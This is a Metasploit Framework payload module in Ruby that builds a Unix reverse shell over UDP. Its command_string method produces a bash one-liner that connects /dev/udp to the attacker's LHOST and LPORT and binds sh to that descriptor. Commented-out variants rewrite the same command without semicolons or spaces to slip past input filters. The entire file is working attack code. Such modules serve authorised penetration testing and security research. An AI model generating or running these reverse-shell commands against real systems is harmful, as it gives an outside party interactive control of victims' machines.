##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_udp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule

  CachedSize = :dynamic

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Unix Command Shell, Reverse UDP (/dev/udp)',
      'Description'   => %q{
        Creates an interactive shell via bash's builtin /dev/udp.

        This will not work on circa 2009 and older Debian-based Linux
        distributions (including Ubuntu) because they compile bash
        without the /dev/udp feature.
      },
      'Author'        => [
        'hdm',   # Reverse bash TCP
        'bcoles' # Reverse bash UDP
      ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'unix',
      'Arch'          => ARCH_CMD,
      'Handler'       => Msf::Handler::ReverseUdp,
      'Session'       => Msf::Sessions::CommandShell,
      'PayloadType'   => 'cmd_bash',
      'RequiredCmd'   => 'bash-udp',
      'Payload'       =>
        {
          'Offsets' => { },
          'Payload' => ''
        }
      ))
  end

  #
  # Constructs the payload
  #
  def generate
    return super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    fd = rand(200) + 20
    return "0<&#{fd}-;exec #{fd}<>/dev/udp/#{datastore['LHOST']}/#{datastore['LPORT']};sh <&#{fd} >&#{fd} 2>&#{fd}";
    # same thing, no semicolons
    #return "/bin/bash #{fd}<>/dev/udp/#{datastore['LHOST']}/#{datastore['LPORT']} <&#{fd} >&#{fd}"
    # same thing, no spaces
    #return "s=${IFS:0:1};eval$s\"bash${s}#{fd}<>/dev/udp/#{datastore['LHOST']}/#{datastore['LPORT']}$s<&#{fd}$s>&#{fd}&\""
  end
end
